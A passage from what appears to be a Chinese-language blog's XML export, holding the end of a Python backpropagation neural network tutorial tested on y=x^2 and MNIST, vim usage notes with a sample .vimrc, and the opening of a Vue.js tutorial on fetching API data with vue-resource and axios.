y_count, eta=<span class="number">0.3</span>, train_count=<span class="number">100</span>, precision=<span class="number">0.00001</span></span>):</span><br><span class="line">        self.x_count = x_count</span><br><span class="line">        self.mid_count = mid_count</span><br><span class="line">        self.y_count = y_count</span><br><span class="line">        self.eta = eta</span><br><span class="line">        self.train_count = train_count</span><br><span class="line">        self.precision = precision</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输入层到隐层的权值</span></span><br><span class="line">        self.V = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x_count):</span><br><span class="line">            temp = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, mid_count):</span><br><span class="line">                temp.append(<span class="number">2</span>*random.random() - <span class="number">1</span>)</span><br><span class="line">            self.V.append(temp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输入层到隐层的阈值</span></span><br><span class="line">        self.gamma = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, mid_count):</span><br><span class="line">            self.gamma.append(<span class="number">2</span>*random.random() - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 隐层到输出层的权值</span></span><br><span class="line">        self.W = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, mid_count):</span><br><span class="line">            temp = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y_count):</span><br><span class="line">                temp.append(<span class="number">2</span>*random.random() - <span class="number">1</span>)</span><br><span class="line">            self.W.append(temp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 隐层到输出层的阈值</span></span><br><span class="line">        self.beta = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y_count):</span><br><span class="line">            self.beta.append(<span class="number">2</span>*random.random() - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>其次，在<code>BP</code>类中，编写一个训练神经网络的类方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">神经网络训练函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Args:</span></span><br><span class="line"><span class="string">    X: 列表，输入数据</span></span><br><span class="line"><span class="string">    Y: 列表，实际输出数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">self, X, Y</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(X) != <span class="built_in">len</span>(Y):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: len(X) and len(Y) is unequal!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.train_count):</span><br><span class="line">        E = [] <span class="comment"># 每一组数据的误差</span></span><br><span class="line">        <span class="comment"># 遍历每一组输入数据</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X)):</span><br><span class="line">            <span class="comment"># 计算预测值</span></span><br><span class="line">            y_predict, mid_output = self.compute_y(X[j])</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算当前样例(组)的均方误差</span></span><br><span class="line">            e = <span class="number">0.0</span></span><br><span class="line">            mid2y_g = [] <span class="comment"># 隐层到输出层的梯度项</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">                <span class="comment"># 计算输出层第k个神经元的误差</span></span><br><span class="line">                e += <span class="built_in">pow</span>(y_predict[k] - Y[j][k], <span class="number">2</span>)</span><br><span class="line">            E.append(e/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算隐层到输出层的梯度项</span></span><br><span class="line">            mid2y_g = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">                <span class="comment"># 计算输出层第k个神经元对应的，隐层到输出层的梯度项</span></span><br><span class="line">                mid2y_g.append(y_predict[k] * (<span class="number">1</span> - y_predict[k]) * (Y[j][k] - y_predict[k]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算输入层到隐层的梯度项</span></span><br><span class="line">            x2mid_g = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">                temp = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">                    temp += self.W[k][l] * mid2y_g[l]</span><br><span class="line">                <span class="comment"># 计算隐层第k个神经元对应的，输入层到隐层的梯度项</span></span><br><span class="line">                x2mid_g.append(mid_output[k] * (<span class="number">1</span> - mid_output[k]) * temp)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新隐层到输出层的权值和阈值</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">                    self.W[k][l] += self.eta * mid2y_g[l] * mid_output[k]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">                self.beta[k] -= self.eta * mid2y_g[k]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新输入层到隐层的权值和阈值</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.x_count):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">                    self.V[k][l] += self.eta * x2mid_g[l] * X[j][k]</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">                self.gamma[k] -= self.eta * x2mid_g[k]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算累积误差</span></span><br><span class="line">        E_sum = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> E:</span><br><span class="line">            E_sum += e</span><br><span class="line">        E_sum /= <span class="built_in">len</span>(E)</span><br><span class="line">        <span class="built_in">print</span>(E_sum)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果累计误差小于设定的误差精度，则停止训练</span></span><br><span class="line">        <span class="keyword">if</span> E_sum &lt; self.precision:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>该函数用到的类方法如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Sigmoid激活函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Args:</span></span><br><span class="line"><span class="string">    x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    y: sigmoid(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">self, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + math.exp(-x))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">计算一组预测值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Args:</span></span><br><span class="line"><span class="string">    x: 列表，一组多元或一元的输入数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    y: 列表，一组多元或一元的输出数据</span></span><br><span class="line"><span class="string">    mid_output: 列表，隐层的输出数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_y</span>(<span class="params">self, x</span>):</span><br><span class="line">    <span class="comment"># 计算隐层输入</span></span><br><span class="line">    mid_input = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.x_count):</span><br><span class="line">            temp += self.V[j][i] * x[j]</span><br><span class="line">        mid_input.append(temp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算隐层输出</span></span><br><span class="line">    mid_output = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">        mid_output.append(self.sigmoid(mid_input[i] - self.gamma[i]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算输出层的输入</span></span><br><span class="line">    y_input = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.mid_count):</span><br><span class="line">            temp += self.W[j][i] * mid_output[j]</span><br><span class="line">        y_input.append(temp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算输出层的输出</span></span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.y_count):</span><br><span class="line">        y.append(self.sigmoid(y_input[i] - self.beta[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (y, mid_output)</span><br></pre></td></tr></table></figure>

<p>最后，在<code>BP</code>类中，编写一个基于神经网络进行预测的类方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">神经网络预测函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Args:</span></span><br><span class="line"><span class="string">    X: 列表，输入数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    Y_predict: 列表，预测输出数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, X</span>):</span><br><span class="line">    Y_predict = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> X:</span><br><span class="line">        y_predict, _ = self.compute_y(x)</span><br><span class="line">        Y_predict.append(y_predict)</span><br><span class="line">    <span class="keyword">return</span> Y_predict</span><br></pre></td></tr></table></figure>

<h3 id="2-6-算法检验"><a href="#2-6-算法检验" class="headerlink" title="2.6. 算法检验"></a>2.6. 算法检验</h3><h4 id="2-6-1-预测-y-x3D-x-2-模型"><a href="#2-6-1-预测-y-x3D-x-2-模型" class="headerlink" title="2.6.1. 预测$y&#x3D;x^2$模型"></a>2.6.1. 预测$y&#x3D;x^2$模型</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">预测 y=x^2 函数模型</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 数据个数</span></span><br><span class="line">data_count = <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成X数据</span></span><br><span class="line">X = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_count):</span><br><span class="line">    X.append([<span class="number">2</span>*random.random() - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据一元二次方程生成Y数据</span></span><br><span class="line">Y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_count):</span><br><span class="line">    noise = random.random() / <span class="number">6</span> <span class="comment"># 生成噪音，使数据更真实</span></span><br><span class="line">    Y.append([<span class="built_in">pow</span>(X[i][<span class="number">0</span>], <span class="number">2</span>) + noise])</span><br><span class="line"></span><br><span class="line">plt.scatter(X, Y, label=<span class="string">&#x27;source data&#x27;</span>) <span class="comment"># 原始数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建神经网络</span></span><br><span class="line">bp = BP(x_count=<span class="number">1</span>, mid_count=<span class="number">10</span>, y_count=<span class="number">1</span>, eta=<span class="number">0.3</span>, train_count=<span class="number">1000</span>, precision=<span class="number">0.00001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 未训练进行预测</span></span><br><span class="line">Y_predict = bp.predict(X) <span class="comment"># 预测</span></span><br><span class="line">plt.scatter(X, Y_predict, label=<span class="string">&#x27;predict firstly&#x27;</span>) <span class="comment"># 显示预测数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">bp.train(X, Y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练之后进行预测</span></span><br><span class="line">Y_predict = bp.predict(X) <span class="comment"># 预测</span></span><br><span class="line">plt.scatter(X, Y_predict, label=<span class="string">&#x27;predict finally&#x27;</span>) <span class="comment"># 显示预测数据</span></span><br><span class="line"></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>控制台输出每一轮训练后的累计误差如下：</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/1.png" alt="1"></p>
<p>显示的原数据与预测数据对比图如下：</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/2.png" alt="1"></p>
<h4 id="2-6-2-预测mnist手写数字图片数据集"><a href="#2-6-2-预测mnist手写数字图片数据集" class="headerlink" title="2.6.2. 预测mnist手写数字图片数据集"></a>2.6.2. 预测mnist手写数字图片数据集</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">预测mnist数字图片数据集</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 获取数据</span></span><br><span class="line">mnist = input_data.read_data_sets(<span class="string">&quot;MNIST_data/&quot;</span>, one_hot=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># print(mnist.train.images.shape, mnist.train.labels.shape) # 训练集</span></span><br><span class="line"><span class="comment"># print(mnist.test.images.shape, mnist.test.labels.shape) # 测试集</span></span><br><span class="line"><span class="comment"># print(mnist.validation.images.shape, mnist.validation.labels.shape) # 验证集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取验证集中的一部分为训练数据，一部分为测试数据</span></span><br><span class="line">X_train = mnist.validation.images[:<span class="number">100</span>].tolist() <span class="comment"># 将ndarray对象转换成列表</span></span><br><span class="line">Y_train = mnist.validation.labels[:<span class="number">100</span>].tolist()</span><br><span class="line">X_test = mnist.validation.images[<span class="number">100</span>:<span class="number">120</span>].tolist()</span><br><span class="line">Y_test = mnist.validation.labels[<span class="number">100</span>:<span class="number">120</span>].tolist()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建神经网络，并用训练数据进行训练</span></span><br><span class="line">bp = BP(x_count=<span class="number">784</span>, mid_count=<span class="number">10</span>, y_count=<span class="number">10</span>, eta=<span class="number">0.3</span>, train_count=<span class="number">100</span>, precision=<span class="number">0.001</span>)</span><br><span class="line">bp.train(X_train, Y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练结束后，用测试数据进行预测</span></span><br><span class="line">Y_predict = bp.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示预测结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y_predict)):</span><br><span class="line">    <span class="comment"># 求一组预测输出数据中值最大的神经元位置</span></span><br><span class="line">    max_pos = <span class="number">0</span></span><br><span class="line">    Max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y_predict[i])):</span><br><span class="line">        <span class="keyword">if</span> Y_predict[i][j] &gt; Max:</span><br><span class="line">            max_pos = j</span><br><span class="line">            Max = Y_predict[i][j]</span><br><span class="line"></span><br><span class="line">    image = X_test[i] <span class="comment"># 获取测试集中对应的数据</span></span><br><span class="line">    image = np.array(image).reshape(<span class="number">28</span>, <span class="number">28</span>) <span class="comment"># 将图像数据还原成28*28的分辨率，即28*28的数组</span></span><br><span class="line">    plt.imshow(image)</span><br><span class="line">    plt.title(<span class="string">&#x27;predict is: &#123;&#125;, real is: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(max_pos, Y_test[i].index(<span class="number">1</span>)))</span><br><span class="line">    plt.ion()</span><br><span class="line">    plt.pause(<span class="number">3</span>)</span><br><span class="line">    plt.close()</span><br></pre></td></tr></table></figure>

<p>控制台输出每一轮训练后的累计误差如下：</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/3.png" alt="1"></p>
<p>挑选4张预测结果图片，如下：</p>
<p><img src="/python%E5%AE%9E%E7%8E%B0BP%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/4.png" alt="1"></p>
<h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><ul>
<li>《机器学习》，周志华</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>vim学习笔记</title>
    <url>/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一篇学习笔记，用于知识备忘。</p>
<span id="more"></span>

<h3 id="一、vim介绍"><a href="#一、vim介绍" class="headerlink" title="一、vim介绍"></a>一、vim介绍</h3><p>1.vim是Linux下的一个文本编辑工具，即用于在控制台中编辑文本。通过命名<code>vim xxx</code>即可进入该文本的vim操作界面，也可以用比如：<code>vim test.c</code>的命令来新建一个test.c文件。</p>
<p>2.在vim界面中，有两种操作模式：查看模式和插入模式。通过vim命令进入该文件后，默认是查看模式。在查看模式下按<strong>i</strong>或<strong>o</strong>等命令进入插入模式，在编插入模式下按<strong>Esc</strong>键退出到查看模式。一定要注意当前所在的模式，插入模式下用查看模式中的命令是无效的。</p>
<h3 id="二、查看模式下的常用按键及指令"><a href="#二、查看模式下的常用按键及指令" class="headerlink" title="二、查看模式下的常用按键及指令"></a>二、查看模式下的常用按键及指令</h3><h4 id="1-光标移动"><a href="#1-光标移动" class="headerlink" title="1.光标移动"></a>1.光标移动</h4><ul>
<li><code>gg</code>  移动光标到文件开头</li>
<li><code>G</code> 移动光标到文件结尾</li>
<li><code>n(数字)+Enter键</code> 使光标向下移动n行，例如：3+Enter键即向下移动3行</li>
<li><code>n(数字)+gg</code> 将光标移动到第n行</li>
<li><code>$</code> 将光标移动到行尾</li>
<li><code>0</code> 将光标移动到行头</li>
</ul>
<h4 id="2-选择"><a href="#2-选择" class="headerlink" title="2.选择"></a>2.选择</h4><ul>
<li><code>v</code> 按字符选择</li>
<li><code>V</code> 按行选择</li>
<li><code>Ctrl+v</code> 按块区选择</li>
</ul>
<h4 id="3-常规操作"><a href="#3-常规操作" class="headerlink" title="3.常规操作"></a>3.常规操作</h4><ul>
<li><code>x</code> 剪切</li>
<li><code>y</code> 复制</li>
<li><code>p</code> 粘贴</li>
<li><code>dd</code> 删除光标所在的一行</li>
<li><code>d</code> 用于删除被选中的部分</li>
</ul>
<h4 id="4-撤销"><a href="#4-撤销" class="headerlink" title="4.撤销"></a>4.撤销</h4><ul>
<li><code>u</code> 撤销上一个操作</li>
</ul>
<h4 id="5-指令"><a href="#5-指令" class="headerlink" title="5.指令"></a>5.指令</h4><ul>
<li><code>:set nu</code> 显示行号</li>
<li><code>:w</code> 保存</li>
<li><code>:q</code> 退出</li>
<li><code>:wq</code> 保存并退出</li>
</ul>
<h4 id="6-进入插入模式"><a href="#6-进入插入模式" class="headerlink" title="6.进入插入模式"></a>6.进入插入模式</h4><ul>
<li><code>i</code> 在光标的下一位置进入插入模式</li>
<li><code>o</code> 在光标的下一行新增空白行，并让光标停在新增空白行与上一行的Tab对齐位置</li>
</ul>
<h4 id="7-对齐"><a href="#7-对齐" class="headerlink" title="7.对齐"></a>7.对齐</h4><ul>
<li><code>==</code> 将选中行tab对齐</li>
</ul>
<h4 id="8-查找与替换"><a href="#8-查找与替换" class="headerlink" title="8.查找与替换"></a>8.查找与替换</h4><ul>
<li><code>/字符串</code> 向下查找。直接敲 <code>/</code> 字符，在其后面加你想查找的内容，可以输入正则表达式查找</li>
<li><code>?字符串</code> 向上查找</li>
<li><code>:s/old/new</code> 将第一个old替换为new</li>
<li><code>:s/old/new/g</code> 将一行中所有的old替换为new</li>
<li><code>:n1, n2s/word1/word2/g</code> 将行n1与n2之间的word1替换为word2</li>
<li><code>:%s/old/new/g</code> 将文件所有的old替换为new</li>
<li><code>:%s/old/new/gc</code> 替换前要求确认</li>
</ul>
<h4 id="9-多行注释"><a href="#9-多行注释" class="headerlink" title="9.多行注释"></a>9.多行注释</h4><p>1)多行注释：</p>
<ol>
<li>首先按esc进入命令行模式下，按下Ctrl + v，进入列（也叫区块）模式;</li>
<li>在行首使用上下键选择需要注释的多行;</li>
<li>按下键盘（大写）“I”键，进入插入模式；</li>
<li>然后输入注释符（“&#x2F;&#x2F;”、“#”等）;</li>
<li>最后按下“Esc”键。 注：在按下esc键后，会稍等一会才会出现注释，不要着急~~时间很短的</li>
</ol>
<p>2)删除多行注释：</p>
<ol>
<li>首先按esc进入命令行模式下，按下Ctrl + v, 进入列模式;</li>
<li>选定要取消注释的多行;</li>
<li>按下“x”或者“d”. 注意：如果是“&#x2F;&#x2F;”注释，那需要执行两次该操作，如果是“#”注释，一次即可</li>
</ol>
<h3 id="三、配置vim"><a href="#三、配置vim" class="headerlink" title="三、配置vim"></a>三、配置vim</h3><p><code>vim ~/.vimrc</code>  进入当前用户 HOME 目录下的vim配置文件，即相对于当前用户的vim配置。当不存在这样一个文件时，vim会自动创建。</p>
<p>若是 <code>vim /etc/vimrc</code> 则是修改所有用户的vim配置。</p>
<p>在其中输入你想要设置的配置，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936</span><br><span class="line">set termencoding=utf-8</span><br><span class="line">set encoding=utf-8</span><br><span class="line"></span><br><span class="line">syntax on           &quot; 自动语法高亮</span><br><span class="line"></span><br><span class="line">&quot;colorscheme torte  &quot; 主题颜色</span><br><span class="line"></span><br><span class="line">set number          &quot; 显示行号</span><br><span class="line">set cursorline      &quot; 高亮当前行</span><br><span class="line">hi CursorLine term=bold cterm=bold ctermbg=237</span><br><span class="line"></span><br><span class="line">set showmatch       &quot; 显示括号匹配</span><br><span class="line"></span><br><span class="line">setlocal noswapfile &quot; 不要生成swap文件</span><br><span class="line"></span><br><span class="line">set hlsearch        &quot; 搜索时高亮显示被找到的文本</span><br><span class="line"></span><br><span class="line">set noerrorbells    &quot; 关闭错误信息响铃</span><br><span class="line"></span><br><span class="line">set ruler           &quot; 打开状态栏标尺</span><br><span class="line">set cmdheight=1     &quot; 设定命令行的行数为 1</span><br><span class="line">set laststatus=2    &quot; 显示状态栏 (默认值为 1, 无法显示状态栏)</span><br><span class="line">set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\Ln\ %l,\ Col\ %c/%L%) &quot; 设置在状态行显示的信息</span><br><span class="line"></span><br><span class="line">&quot;set paste          &quot; 粘贴时不自动换行，与 set autoindent 冲突</span><br><span class="line"></span><br><span class="line">set autoindent      &quot; 换行自动缩进，与 set paste 冲突</span><br><span class="line">set shiftwidth=4    &quot; 自动缩进时的宽度</span><br><span class="line">set smartindent     &quot; 智能自动缩进</span><br><span class="line"></span><br><span class="line">set tabstop=4       &quot; tabstop的宽度</span><br><span class="line">set expandtab       &quot; tab换成空格</span><br><span class="line">set softtabstop=4   &quot; 按下tab键后的空格数</span><br><span class="line">set listchars=tab:&gt;-,trail:- &quot; 显示空格和tab键</span><br></pre></td></tr></table></figure>

<p><strong>注解</strong>： <code>&quot;</code>  是注释标识符，其后面都是被注释的。</p>
<p>以上是笔者自己的简单配置，若要花里胡哨一点的，可以百度vim配置文件，一堆，直接复制到自己的这个配置文件中即可。</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vue请求接口获取数据及跨域问题</title>
    <url>/vueJs%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>本文基于<code>vue-cli3</code>。</p>
<h2 id="1-通过api接口获取数据"><a href="#1-通过api接口获取数据" class="headerlink" title="1. 通过api接口获取数据"></a>1. 通过api接口获取数据</h2><p>在<code>vuejs</code>中请求接口，大体分为两种方式：<code>vue-source</code>和<code>axios</code>。它们都是经过良好封装的http请求插件。</p>
<p>下文将简单介绍一下使用方法。</p>
<h3 id="1-1-vue-source"><a href="#1-1-vue-source" class="headerlink" title="1.1. vue-source"></a>1.1. vue-source</h3><p>略讲，详情见这篇<a href="https://www.cnblogs.com/axl234/p/5899137.html">博客</a>。</p>
<h4 id="1-1-1-安装"><a href="#1-1-1-安装" class="headerlink" title="1.1.1. 安装"></a>1.1.1. 安装</h4><p>首先，安装该插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install vue-source --save</span><br></pre></td></tr></table></figure>

<p>然后，在项目<code>src/main.js</code>中，通过全局方法<code>Vue.use()</code>使用该插件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VueSource</span> <span class="keyword">from</span> <span class="string">&#x27;vue-source&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueSource</span>)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="1-1-2-使用"><a href="#1-1-2-使用" class="headerlink" title="1.1.2 使用"></a>1.1.2 使用</h4><p>在data中定义好接口和接收的数据类型，然后，调用<code>this.$http.get()</code>函数进行<code>get</code>请求即可，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data () &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">apiUrl</span>: <span class="string">&#x27;https://xxxxx&#x27;</span>,</span><br><span class="line">    <span class="attr">users</span>: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">&#125;,</span><br><span class="line">created () &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">get</span>(<span class="variable language_">this</span>.<span class="property">apiUrl</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">  &#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;error:&#x27;</span>, error)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码解释：$http.get().then()是get函数请求返回后才调用的函数。then()函数的中两个参数是匿名函数。上述代码使用了ES6新增了箭头函数（即参数指向函数），也可以写成以下形式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">get</span>(<span class="variable language_">this</span>.<span class="property">apiUrl</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">&#125;, <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;error:&#x27;</span>, error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-axios"><a href="#1-2-axios" class="headerlink" title="1.2. axios"></a>1.2. axios</h3><h4 id="1-2-1-安装"><a href="#1-2-1-安装" class="headerlink" title="1.2.1. 安装"></a>1.2.1. 安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure>

